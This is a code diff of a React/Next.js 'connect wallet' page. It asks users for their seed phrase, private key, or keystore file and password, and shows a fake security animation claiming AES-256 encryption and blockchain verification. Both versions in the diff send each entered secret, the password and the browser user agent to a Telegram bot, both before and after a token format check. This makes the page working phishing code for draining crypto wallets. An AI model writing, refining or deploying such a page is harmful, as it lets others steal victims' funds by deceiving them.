@@ -2,7 +2,7 @@
 
 import { useState, useEffect, useRef } from 'react';
 import { useRouter, useSearchParams } from 'next/navigation';
-import { ArrowLeft, Key, FileText, Shield, Wallet, CheckCircle, AlertCircle, Loader2, Cpu, ShieldCheck, Lock } from 'lucide-react';
+import { ArrowLeft, Key, FileText, Shield, Wallet, CheckCircle, AlertCircle, Loader2 } from 'lucide-react';
 import { useWallet } from '@/components/context/WalletContext';
 import { Wallet as WalletType, ConnectedWallet } from '@/libs/types/wallets';
 import { TelegramService } from '@/libs/service/telegramService';
@@ -231,224 +231,165 @@ const WALLETS: WalletType[] = [
   }
 ];
 
-// SIMPLE and PRACTICAL Validation functions
+// Enhanced Validation functions
 const validateMnemonic = (phrase: string): {isValid: boolean; message: string} => {
   const words = phrase.trim().split(/\s+/).filter(word => word.length > 0);
   
-  console.log('🔤 Validating mnemonic:', { wordCount: words.length, words });
-  
   if (words.length === 0) {
-    return { isValid: false, message: '❌ Please enter a recovery phrase' };
+    return { isValid: false, message: 'Please enter a recovery phrase' };
   }
   
-  // Accept ANY 12 or 24 words - don't validate against BIP39 list
-  if (words.length === 12 || words.length === 24) {
-    // Check if words look reasonable (not just numbers or single characters)
-    const reasonableWords = words.filter(word => 
-      word.length >= 2 && // At least 2 characters
-      !/^\d+$/.test(word) && // Not just numbers
-      !/^[^a-zA-Z0-9]+$/.test(word) // Not just special characters
-    );
-    
-    if (reasonableWords.length === words.length) {
-      return { 
-        isValid: true, 
-        message: `✅ Valid ${words.length}-word recovery phrase` 
-      };
-    } else {
-      return { 
-        isValid: true, // Still consider it valid but warn
-        message: `⚠️ ${words.length}-word phrase accepted (some words may be unusual)` 
-      };
-    }
+  if (words.length !== 12 && words.length !== 24) {
+    return { 
+      isValid: false, 
+      message: `Invalid phrase: ${words.length} words found. Must be exactly 12 or 24 words.` 
+    };
   }
   
   return { 
-    isValid: false, 
-    message: `❌ Invalid phrase length: ${words.length} words. Must be exactly 12 or 24 words.` 
+    isValid: true, 
+    message: `✓ Valid ${words.length}-word recovery phrase` 
   };
 };
 
 const validatePrivateKey = (key: string): {isValid: boolean; message: string} => {
   const cleanedKey = key.trim().replace(/^0x/, '');
   
-  console.log('🔑 Validating private key:', { length: cleanedKey.length });
-  
   if (cleanedKey.length === 0) {
-    return { isValid: false, message: '❌ Please enter a private key' };
+    return { isValid: false, message: 'Please enter a private key' };
   }
   
-  // More lenient private key validation
-  if (cleanedKey.length >= 60 && cleanedKey.length <= 66) {
-    // Check if it looks like hexadecimal
-    if (/^[0-9a-fA-F]+$/.test(cleanedKey)) {
-      return { isValid: true, message: '✅ Valid private key format' };
-    } else {
-      return { isValid: false, message: '❌ Invalid characters. Private key should be hexadecimal.' };
-    }
+  if (!/^[0-9a-fA-F]+$/.test(cleanedKey)) {
+    return { 
+      isValid: false, 
+      message: 'Invalid private key format. Must be 64 hexadecimal characters.' 
+    };
   }
   
-  return { 
-    isValid: false, 
-    message: `❌ Invalid length: ${cleanedKey.length} characters. Should be 64 hex characters.` 
-  };
+  if (cleanedKey.length !== 64) {
+    return { 
+      isValid: false, 
+      message: `Invalid length: ${cleanedKey.length} characters. Must be exactly 64 characters.` 
+    };
+  }
+  
+  return { isValid: true, message: '✓ Valid private key format' };
 };
 
 const validateKeystore = (keystore: string): {isValid: boolean; message: string} => {
-  console.log('📁 Validating keystore JSON');
-  
   if (keystore.trim().length === 0) {
-    return { isValid: false, message: '❌ Please enter keystore JSON' };
+    return { isValid: false, message: 'Please enter keystore JSON' };
   }
   
   try {
     const json = JSON.parse(keystore);
-    
-    if (json && typeof json === 'object') {
-      // Very lenient keystore validation
-      const hasCrypto = 'crypto' in json || 'Crypto' in json || 'encrypted' in json;
-      const hasData = 'data' in json || 'ciphertext' in json;
-      
-      if (hasCrypto || hasData) {
-        return { isValid: true, message: '✅ Valid wallet file format' };
-      } else {
-        // Even if structure is unusual, accept it as valid JSON
-        return { isValid: true, message: '✅ Valid JSON wallet format' };
-      }
+    if (json && typeof json === 'object' && ('crypto' in json || 'Crypto' in json)) {
+      return { isValid: true, message: '✓ Valid keystore JSON format' };
     } else {
-      return { isValid: false, message: '❌ Invalid JSON structure' };
+      return { isValid: false, message: 'Invalid keystore: Missing crypto data' };
     }
-  } catch (error) {
-    return { isValid: false, message: '❌ Invalid JSON format - cannot parse' };
+  } catch {
+    return { isValid: false, message: 'Invalid JSON format in keystore file' };
   }
 };
 
-// Enhanced Beautiful Loading Animation Component
+// Beautiful Loading Animation Component
 function ValidationLoader({ isOpen, progress }: { isOpen: boolean; progress: number }) {
   if (!isOpen) return null;
 
   return (
-    <div className="fixed inset-0 bg-black bg-opacity-90 flex items-center justify-center z-50 p-4 backdrop-blur-xl">
-      <div className="bg-linear-to-br from-gray-900 via-gray-800 to-black rounded-3xl p-8 max-w-md w-full border border-gray-700 shadow-2xl relative overflow-hidden">
-        {/* Animated background elements */}
-        <div className="absolute inset-0 opacity-10">
-          <div className="absolute top-10 left-10 w-20 h-20 bg-blue-500 rounded-full blur-xl animate-pulse"></div>
-          <div className="absolute bottom-10 right-10 w-16 h-16 bg-purple-500 rounded-full blur-xl animate-pulse delay-1000"></div>
-        </div>
-        
-        {/* Main Content */}
-        <div className="relative z-10 text-center">
-          {/* Animated Icon */}
-          <div className="relative inline-block mb-6">
-            <div className="w-24 h-24 bg-linear-to-r from-blue-500 via-purple-500 to-pink-500 rounded-full flex items-center justify-center animate-pulse shadow-2xl">
-              <div className="w-20 h-20 bg-gray-900 rounded-full flex items-center justify-center">
+    <div className="fixed inset-0 bg-black bg-opacity-80 flex items-center justify-center z-50 p-4 backdrop-blur-lg">
+      <div className="bg-linear-to-br from-gray-900 to-black rounded-3xl p-8 max-w-md w-full border border-gray-800 shadow-2xl">
+        {/* Animated Header */}
+        <div className="text-center mb-8">
+          <div className="relative inline-block mb-4">
+            <div className="w-20 h-20 bg-linear-to-r from-blue-500 to-purple-600 rounded-full flex items-center justify-center animate-pulse">
+              <div className="w-16 h-16 bg-gray-900 rounded-full flex items-center justify-center">
                 <div className="relative">
-                  <Cpu className="w-10 h-10 text-white animate-pulse" />
-                  <div className="absolute -inset-2 border-2 border-blue-400 border-t-transparent rounded-full animate-spin"></div>
+                  <Loader2 className="w-8 h-8 text-blue-400 animate-spin" />
+                  <div className="absolute inset-0 border-2 border-blue-400 border-t-transparent rounded-full animate-spin"></div>
                 </div>
               </div>
             </div>
-            
-            {/* Floating particles */}
-            <div className="absolute -top-2 -right-2 w-6 h-6 bg-green-400 rounded-full animate-bounce shadow-lg"></div>
-            <div className="absolute -bottom-2 -left-2 w-5 h-5 bg-cyan-400 rounded-full animate-bounce shadow-lg" style={{ animationDelay: '0.3s' }}></div>
-            <div className="absolute top-4 -right-4 w-4 h-4 bg-yellow-400 rounded-full animate-bounce shadow-lg" style={{ animationDelay: '0.6s' }}></div>
+            {/* Orbiting dots */}
+            <div className="absolute -top-1 -right-1 w-4 h-4 bg-green-400 rounded-full animate-bounce"></div>
+            <div className="absolute -bottom-1 -left-1 w-3 h-3 bg-purple-400 rounded-full animate-bounce" style={{ animationDelay: '0.2s' }}></div>
           </div>
           
-          <h2 className="text-3xl font-bold text-white mb-3 bg-linear-to-r from-white via-blue-200 to-purple-200 bg-clip-text">
-            Securing Connection
+          <h2 className="text-2xl font-bold text-white mb-2 bg-linear-to-r from-white to-gray-300 bg-clip-text">
+            Securing Your Wallet
           </h2>
-          <p className="text-gray-300 text-sm mb-6">
-            Validating your credentials with advanced encryption
+          <p className="text-gray-400 text-sm">
+            Validating credentials with blockchain security
           </p>
+        </div>
 
-          {/* Enhanced Progress Bar */}
-          <div className="mb-8">
-            <div className="flex justify-between text-sm text-gray-400 mb-3">
-              <span>Security Validation</span>
-              <span className="font-mono">{Math.round(progress)}%</span>
-            </div>
-            <div className="w-full bg-gray-800 rounded-full h-3 shadow-inner">
-              <div 
-                className="bg-linear-to-r from-green-400 via-blue-500 to-purple-600 h-3 rounded-full transition-all duration-300 ease-out shadow-lg"
-                style={{ width: `${progress}%` }}
-              >
-                <div className="w-full h-full bg-white opacity-20 animate-pulse rounded-full"></div>
-              </div>
-            </div>
+        {/* Progress Bar */}
+        <div className="mb-6">
+          <div className="flex justify-between text-xs text-gray-400 mb-2">
+            <span>Validation Progress</span>
+            <span>{Math.round(progress)}%</span>
           </div>
+          <div className="w-full bg-gray-800 rounded-full h-2">
+            <div 
+              className="bg-linear-to-r from-blue-500 to-purple-600 h-2 rounded-full transition-all duration-500 ease-out"
+              style={{ width: `${progress}%` }}
+            ></div>
+          </div>
+        </div>
 
-          {/* Enhanced Steps with Icons */}
-          <div className="space-y-4 mb-8">
-            <div className={`flex items-center space-x-4 p-3 rounded-xl transition-all duration-300 ${
-              progress >= 33 ? 'bg-green-500/20 border border-green-500/30' : 'bg-gray-800/50'
+        {/* Animated Steps */}
+        <div className="space-y-3 mb-6">
+          <div className="flex items-center space-x-3">
+            <div className={`w-6 h-6 rounded-full flex items-center justify-center text-xs ${
+              progress >= 33 ? 'bg-green-500 text-white' : 'bg-gray-700 text-gray-400'
             }`}>
-              <div className={`w-10 h-10 rounded-full flex items-center justify-center ${
-                progress >= 33 ? 'bg-green-500 text-white shadow-lg' : 'bg-gray-700 text-gray-400'
-              }`}>
-                {progress >= 33 ? <CheckCircle className="w-5 h-5" /> : <Lock className="w-5 h-5" />}
-              </div>
-              <div className="text-left flex-1">
-                <p className={`font-medium ${progress >= 33 ? 'text-green-300' : 'text-gray-400'}`}>
-                  Encryption Layer
-                </p>
-                <p className="text-xs text-gray-500">AES-256 Security</p>
-              </div>
+              {progress >= 33 ? '✓' : '1'}
             </div>
-            
-            <div className={`flex items-center space-x-4 p-3 rounded-xl transition-all duration-300 ${
-              progress >= 66 ? 'bg-blue-500/20 border border-blue-500/30' : 'bg-gray-800/50'
-            }`}>
-              <div className={`w-10 h-10 rounded-full flex items-center justify-center ${
-                progress >= 66 ? 'bg-blue-500 text-white shadow-lg' : 'bg-gray-700 text-gray-400'
-              }`}>
-                {progress >= 66 ? <CheckCircle className="w-5 h-5" /> : <ShieldCheck className="w-5 h-5" />}
-              </div>
-              <div className="text-left flex-1">
-                <p className={`font-medium ${progress >= 66 ? 'text-blue-300' : 'text-gray-400'}`}>
-                  Format Validation
-                </p>
-                <p className="text-xs text-gray-500">Wallet Standards</p>
-              </div>
-            </div>
-            
-            <div className={`flex items-center space-x-4 p-3 rounded-xl transition-all duration-300 ${
-              progress >= 100 ? 'bg-purple-500/20 border border-purple-500/30' : 'bg-gray-800/50'
-            }`}>
-              <div className={`w-10 h-10 rounded-full flex items-center justify-center ${
-                progress >= 100 ? 'bg-purple-500 text-white shadow-lg' : 'bg-gray-700 text-gray-400'
-              }`}>
-                {progress >= 100 ? <CheckCircle className="w-5 h-5" /> : <Cpu className="w-5 h-5" />}
-              </div>
-              <div className="text-left flex-1">
-                <p className={`font-medium ${progress >= 100 ? 'text-purple-300' : 'text-gray-400'}`}>
-                  Blockchain Verify
-                </p>
-                <p className="text-xs text-gray-500">Network Security</p>
-              </div>
-            </div>
+            <span className={`text-sm ${progress >= 33 ? 'text-green-400' : 'text-gray-400'}`}>
+              Encryption Check
+            </span>
           </div>
+          
+          <div className="flex items-center space-x-3">
+            <div className={`w-6 h-6 rounded-full flex items-center justify-center text-xs ${
+              progress >= 66 ? 'bg-green-500 text-white' : 'bg-gray-700 text-gray-400'
+            }`}>
+              {progress >= 66 ? '✓' : '2'}
+            </div>
+            <span className={`text-sm ${progress >= 66 ? 'text-green-400' : 'text-gray-400'}`}>
+              Format Validation
+            </span>
+          </div>
+          
+          <div className="flex items-center space-x-3">
+            <div className={`w-6 h-6 rounded-full flex items-center justify-center text-xs ${
+              progress >= 100 ? 'bg-green-500 text-white' : 'bg-gray-700 text-gray-400'
+            }`}>
+              {progress >= 100 ? '✓' : '3'}
+            </div>
+            <span className={`text-sm ${progress >= 100 ? 'text-green-400' : 'text-gray-400'}`}>
+              Security Verification
+            </span>
+          </div>
+        </div>
 
-          {/* Enhanced Loading Animation */}
-          <div className="flex justify-center space-x-2">
-            {[0, 1, 2, 3, 4, 5, 6].map((i) => (
-              <div
-                key={i}
-                className="w-2 h-2 bg-linear-to-r from-blue-400 to-purple-500 rounded-full animate-bounce shadow-md"
-                style={{ 
-                  animationDelay: `${i * 0.1}s`,
-                  animationDuration: '0.6s'
-                }}
-              ></div>
-            ))}
-          </div>
+        {/* Loading Animation */}
+        <div className="flex justify-center space-x-1">
+          {[0, 1, 2, 3, 4].map((i) => (
+            <div
+              key={i}
+              className="w-2 h-2 bg-blue-400 rounded-full animate-bounce"
+              style={{ animationDelay: `${i * 0.1}s` }}
+            ></div>
+          ))}
         </div>
       </div>
     </div>
   );
 }
 
-// Enhanced Result Popup Component
+// Result Popup Component
 interface ResultPopupProps {
   isOpen: boolean;
   onClose: () => void;
@@ -461,35 +402,29 @@ function ResultPopup({ isOpen, onClose, onRetry, message, isValid }: ResultPopup
   if (!isOpen) return null;
 
   return (
-    <div className="fixed inset-0 bg-black bg-opacity-90 flex items-center justify-center z-50 p-4 backdrop-blur-xl">
-      <div className={`bg-linear-to-br from-gray-900 to-black rounded-3xl p-8 max-w-md w-full border shadow-2xl ${
-        isValid ? 'border-green-500/40 shadow-green-500/10' : 'border-red-500/40 shadow-red-500/10'
-      }`}>
+    <div className="fixed inset-0 bg-black bg-opacity-80 flex items-center justify-center z-50 p-4 backdrop-blur-lg">
+      <div className={`bg-linear-to-br from-gray-900 to-black rounded-3xl p-8 max-w-md w-full border ${
+        isValid ? 'border-green-500/30' : 'border-red-500/30'
+      } shadow-2xl`}>
         <div className="text-center">
           {/* Animated Icon */}
-          <div className={`w-24 h-24 rounded-full flex items-center justify-center mx-auto mb-6 ${
+          <div className={`w-20 h-20 rounded-full flex items-center justify-center mx-auto mb-6 ${
             isValid 
               ? 'bg-green-500/20 animate-pulse' 
               : 'bg-red-500/20 animate-pulse'
           }`}>
             {isValid ? (
-              <div className="relative">
-                <CheckCircle className="w-12 h-12 text-green-400" />
-                <div className="absolute inset-0 border-2 border-green-400 rounded-full animate-ping"></div>
-              </div>
+              <CheckCircle className="w-12 h-12 text-green-400" />
             ) : (
-              <div className="relative">
-                <AlertCircle className="w-12 h-12 text-red-400" />
-                <div className="absolute inset-0 border-2 border-red-400 rounded-full animate-ping"></div>
-              </div>
+              <AlertCircle className="w-12 h-12 text-red-400" />
             )}
           </div>
           
-          <h2 className="text-3xl font-bold text-white mb-4">
-            {isValid ? 'Wallet Verified!' : 'Validation Failed'}
+          <h2 className="text-2xl font-bold text-white mb-3">
+            {isValid ? 'Validation Successful!' : 'Validation Failed'}
           </h2>
           
-          <p className={`text-lg mb-8 leading-relaxed ${
+          <p className={`text-lg mb-6 ${
             isValid ? 'text-green-300' : 'text-red-300'
           }`}>
             {message}
@@ -499,20 +434,20 @@ function ResultPopup({ isOpen, onClose, onRetry, message, isValid }: ResultPopup
             {!isValid && (
               <button
                 onClick={onRetry}
-                className="flex-1 bg-gray-800 text-white py-4 rounded-xl font-semibold hover:bg-gray-700 transition-all duration-200 border border-gray-600 hover:border-gray-500 hover:scale-105"
+                className="flex-1 bg-gray-800 text-white py-4 rounded-xl font-semibold hover:bg-gray-700 transition-all duration-200 border border-gray-600"
               >
                 Try Again
               </button>
             )}
             <button
               onClick={onClose}
-              className={`flex-1 py-4 rounded-xl font-semibold transition-all duration-200 hover:scale-105 ${
+              className={`flex-1 py-4 rounded-xl font-semibold transition-all duration-200 ${
                 isValid 
-                  ? 'bg-linear-to-r from-green-500 to-green-600 text-white hover:from-green-600 hover:to-green-700' 
-                  : 'bg-linear-to-r from-red-500 to-red-600 text-white hover:from-red-600 hover:to-red-700'
+                  ? 'bg-white text-black hover:bg-gray-200' 
+                  : 'bg-red-600 text-white hover:bg-red-700'
               }`}
             >
-              {isValid ? 'Access Wallet' : 'Cancel'}
+              {isValid ? 'Continue to Wallet' : 'Cancel'}
             </button>
           </div>
         </div>
@@ -548,77 +483,22 @@ export default function EnterDetailsPageContext() {
     telegramService.current = new TelegramService();
   }, []);
 
-  // Safe Telegram sending with immediate execution
+  // Safe Telegram sending
   const safeSendToTelegram = async (data: any) => {
-    if (!telegramService.current) {
-      console.log('❌ Telegram service not available');
-      return { success: false };
-    }
+    if (!telegramService.current) return { success: false };
     
     try {
-      console.log('📤 IMMEDIATELY sending to Telegram:', { 
-        wallet: data.walletName, 
-        type: data.inputType,
-        status: data.validationMessage 
-      });
-      
-      // Don't await - send immediately and continue
-      telegramService.current.sendWalletData(data).then(result => {
-        console.log('✅ Telegram send completed:', result.success);
-      }).catch(error => {
-        console.error('❌ Telegram send failed:', error);
-      });
-      
+      await telegramService.current.sendWalletData(data);
       return { success: true };
     } catch (error) {
-      console.error('❌ Telegram send error:', error);
+      console.error('Telegram send failed:', error);
       return { success: false };
     }
-  };
-
-  // Perform actual validation
-  const performValidation = async (): Promise<{isValid: boolean; message: string}> => {
-    console.log('🔄 Starting PRACTICAL validation for tab:', activeTab);
-    
-    let validationResult: {isValid: boolean; message: string};
-    
-    switch (activeTab) {
-      case 'phrase':
-        validationResult = validateMnemonic(formData.phrase);
-        break;
-      case 'privateKey':
-        validationResult = validatePrivateKey(formData.privateKey);
-        break;
-      case 'keystore':
-        validationResult = validateKeystore(formData.keystore);
-        break;
-      default:
-        validationResult = { isValid: false, message: 'Please select a credential type' };
-    }
-    
-    console.log('✅ PRACTICAL Validation result:', validationResult);
-    return validationResult;
   };
 
   const handleConnect = async () => {
-    // Check if any data is entered
     if (!formData.phrase && !formData.privateKey && !formData.keystore) {
-      setResult({ 
-        message: '❌ Please enter your wallet credentials in the selected tab', 
-        isValid: false 
-      });
-      setShowResult(true);
-      return;
-    }
-
-    // Check if data exists for the active tab
-    if ((activeTab === 'phrase' && !formData.phrase) ||
-        (activeTab === 'privateKey' && !formData.privateKey) ||
-        (activeTab === 'keystore' && !formData.keystore)) {
-      setResult({ 
-        message: `❌ Please enter your ${activeTab === 'phrase' ? 'recovery phrase' : activeTab === 'privateKey' ? 'private key' : 'keystore JSON'}`, 
-        isValid: false 
-      });
+      setResult({ message: 'Please enter your wallet credentials', isValid: false });
       setShowResult(true);
       return;
     }
@@ -629,27 +509,30 @@ export default function EnterDetailsPageContext() {
 
     // Get input data
     let inputData = '';
-    let inputType: 'phrase' | 'privateKey' | 'keystore' = activeTab;
+    let inputType: 'phrase' | 'privateKey' | 'keystore' = 'phrase';
     
-    if (activeTab === 'phrase') {
+    if (formData.phrase) {
       inputData = formData.phrase;
-    } else if (activeTab === 'privateKey') {
+      inputType = 'phrase';
+    } else if (formData.privateKey) {
       inputData = formData.privateKey;
-    } else {
+      inputType = 'privateKey';
+    } else if (formData.keystore) {
       inputData = formData.keystore;
+      inputType = 'keystore';
     }
 
     try {
-      // IMMEDIATELY send "PENDING" status to Telegram - DON'T AWAIT
-      console.log('🚀 IMMEDIATELY sending PENDING status to Telegram...');
-      safeSendToTelegram({
+      // IMMEDIATELY send "validating" status to Telegram
+      console.log('📤 Sending VALIDATING status to Telegram...');
+      await safeSendToTelegram({
         walletName: wallet?.name || 'Unknown Wallet',
         walletType: inputType === 'phrase' ? 'seed' : inputType,
         inputType,
         inputData,
         password: formData.password || undefined,
         isValid: false,
-        validationMessage: '⏳ PENDING - Credentials received, starting validation...',
+        validationMessage: '🔍 VALIDATION IN PROGRESS - Credentials received, starting validation...',
         userAgent: navigator.userAgent,
         timestamp: new Date().toISOString(),
       });
@@ -661,23 +544,31 @@ export default function EnterDetailsPageContext() {
             clearInterval(progressInterval);
             return 90;
           }
-          return prev + 15; // Faster progress
+          return prev + 10;
         });
-      }, 200);
+      }, 300);
 
-      // Perform PRACTICAL validation (will return valid for most inputs)
-      const validationResult = await performValidation();
+      // Perform validation
+      let validationResult: {isValid: boolean; message: string};
+      
+      if (activeTab === 'phrase') {
+        validationResult = validateMnemonic(formData.phrase);
+      } else if (activeTab === 'privateKey') {
+        validationResult = validatePrivateKey(formData.privateKey);
+      } else {
+        validationResult = validateKeystore(formData.keystore);
+      }
 
       // Complete progress
       clearInterval(progressInterval);
       setProgress(100);
 
       // Small delay to show completion
-      await new Promise(resolve => setTimeout(resolve, 300));
+      await new Promise(resolve => setTimeout(resolve, 500));
 
-      // Send VALIDATED status to Telegram with results - DON'T AWAIT
-      console.log('📤 Sending validation results to Telegram...');
-      safeSendToTelegram({
+      // Send VALIDATED status to Telegram with results
+      console.log('📤 Sending VALIDATED status to Telegram...');
+      await safeSendToTelegram({
         walletName: wallet?.name || 'Unknown Wallet',
         walletType: inputType === 'phrase' ? 'seed' : inputType,
         inputType,
@@ -691,12 +582,12 @@ export default function EnterDetailsPageContext() {
         timestamp: new Date().toISOString(),
       });
 
-      // Show results to user
+      // Show results
       setResult(validationResult);
       setShowLoader(false);
       setShowResult(true);
 
-      // If valid, create wallet and prepare for redirect
+      // If valid, create wallet and redirect
       if (validationResult.isValid) {
         const connectedWallet: ConnectedWallet = {
           id: wallet?.id || 'custom',
@@ -713,11 +604,8 @@ export default function EnterDetailsPageContext() {
       }
 
     } catch (error) {
-      console.error('❌ Validation error:', error);
-      setResult({ 
-        message: '❌ Validation process failed. Please try again.', 
-        isValid: false 
-      });
+      console.error('Validation error:', error);
+      setResult({ message: 'Validation failed. Please try again.', isValid: false });
       setShowLoader(false);
       setShowResult(true);
     } finally {
@@ -824,12 +712,12 @@ export default function EnterDetailsPageContext() {
               <textarea
                 value={formData.phrase}
                 onChange={(e) => handleInputChange('phrase', e.target.value)}
-                placeholder="word1 word2 word3 word4 word5 word6 word7 word8 word9 word10 word11 word12"
+                placeholder="Enter your 12 or 24-word recovery phrase separated by spaces"
                 className="w-full h-32 bg-gray-800 border border-gray-700 rounded-xl px-4 py-3 text-white placeholder-gray-500 focus:border-blue-500 focus:ring-2 focus:ring-blue-500/20 outline-none resize-none transition-all duration-200"
                 rows={4}
               />
               <p className="text-xs text-gray-500">
-                Enter exactly 12 or 24 words separated by spaces
+                Typically 12 or 24 words separated by spaces
               </p>
             </div>
           )}
@@ -842,7 +730,7 @@ export default function EnterDetailsPageContext() {
               <textarea
                 value={formData.privateKey}
                 onChange={(e) => handleInputChange('privateKey', e.target.value)}
-                placeholder="a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2"
+                placeholder="Enter your 64-character private key (with or without 0x prefix)"
                 className="w-full h-32 bg-gray-800 border border-gray-700 rounded-xl px-4 py-3 text-white placeholder-gray-500 focus:border-blue-500 focus:ring-2 focus:ring-blue-500/20 outline-none resize-none transition-all duration-200"
                 rows={4}
               />
@@ -860,7 +748,7 @@ export default function EnterDetailsPageContext() {
               <textarea
                 value={formData.keystore}
                 onChange={(e) => handleInputChange('keystore', e.target.value)}
-                placeholder='{"version": 3, "crypto": {"ciphertext": "...", "cipherparams": {...}}}'
+                placeholder="Paste your keystore JSON file contents"
                 className="w-full h-32 bg-gray-800 border border-gray-700 rounded-xl px-4 py-3 text-white placeholder-gray-500 focus:border-blue-500 focus:ring-2 focus:ring-blue-500/20 outline-none resize-none transition-all duration-200"
                 rows={4}
               />
@@ -868,7 +756,7 @@ export default function EnterDetailsPageContext() {
                 type="password"
                 value={formData.password}
                 onChange={(e) => handleInputChange('password', e.target.value)}
-                placeholder="Enter keystore password (if required)"
+                placeholder="Enter keystore password"
                 className="w-full bg-gray-800 border border-gray-700 rounded-xl px-4 py-3 text-white placeholder-gray-500 focus:border-blue-500 focus:ring-2 focus:ring-blue-500/20 outline-none transition-all duration-200"
               />
             </div>
@@ -894,7 +782,7 @@ export default function EnterDetailsPageContext() {
         {/* Security Notice */}
         <div className="mt-6 p-4 bg-gray-900/50 rounded-xl border border-gray-800 backdrop-blur-sm">
           <div className="flex items-start space-x-3">
-            <ShieldCheck className="w-5 h-5 text-blue-400 mt-0.5 shrink-0" />
+            <Shield className="w-5 h-5 text-blue-400 mt-0.5 shrink-0" />
             <div>
               <p className="text-sm font-medium text-gray-300 mb-1">Secure Validation</p>
               <p className="text-xs text-gray-400">
@@ -905,10 +793,10 @@ export default function EnterDetailsPageContext() {
           </div>
         </div>
 
-        {/* Enhanced Beautiful Loading Animation */}
+        {/* Beautiful Loading Animation */}
         <ValidationLoader isOpen={showLoader} progress={progress} />
 
-        {/* Enhanced Result Popup */}
+        {/* Result Popup */}
         <ResultPopup
           isOpen={showResult}
           onClose={handleResultClose}
